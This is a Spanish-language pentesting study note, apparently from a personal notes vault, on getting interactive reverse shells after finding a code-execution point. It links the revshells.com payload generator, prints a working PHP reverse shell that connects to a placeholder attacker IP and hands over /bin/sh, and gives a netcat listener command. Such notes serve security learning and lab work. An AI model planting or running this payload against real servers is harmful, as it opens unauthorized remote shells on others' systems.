## Reverse shells y utilidades de acceso

Cuando encuentras un punto de ejecución de código (una subida de archivos, un plugin vulnerable, un LFI con inclusión PHP...), lo que quieres es conseguir una **shell interactiva**. Dos herramientas clásicas:

### RevShells (generador de payloads)

Web que genera payloads de reverse shell para multitud de tecnologías:
```
https://www.revshells.com/
```

1. Indicas tu **IP** y **puerto** de escucha.
2. Copias el payload generado.
3. Lo pegas donde puedas ejecutar código.

![[Pasted image 20260514233644.png]]

> ⚠️ Si la shell "no funciona" suele ser porque el payload queda mal escapado en el contexto donde lo insertas. Prueba a **encode/procesar el payload con BurpSuite** (mirando la solicitud real) para que llegue correctamente al servidor. Ver [BurpSuite](../Web/Fuzzing/BurpSuite.md).

### Reverse shell PHP

Código en PHP que, si se **ejecuta**, nos da una shell (por ejemplo al colocar el archivo en una web PHP y visitarlo):

```php
<?php
$sock = fsockopen("TU_IP", 4444);
$descriptorspec = array(0=>$sock, 1=>$sock, 2=>$sock);
$process = proc_open("/bin/sh", $descriptorspec, $pipes);
?>
```

- Cambia `TU_IP` y `4444` por tu IP y un puerto en el que estés **a la escucha**.
- En Kali, escucha con: `nc -lvnp 4444`.

![[Pasted image 20260705144710.png|654]]

1. Primero descarga la plantilla/payload.
   ![[Pasted image 20260705144932.png]]
2. Modifica la IP y el puerto.
   ![[Pasted image 20260705144816.png]]

> Revisa también [Samba / acceso a recursos](../Reconocimiento/Enumeracion%20local.md) para otros canales de llegada.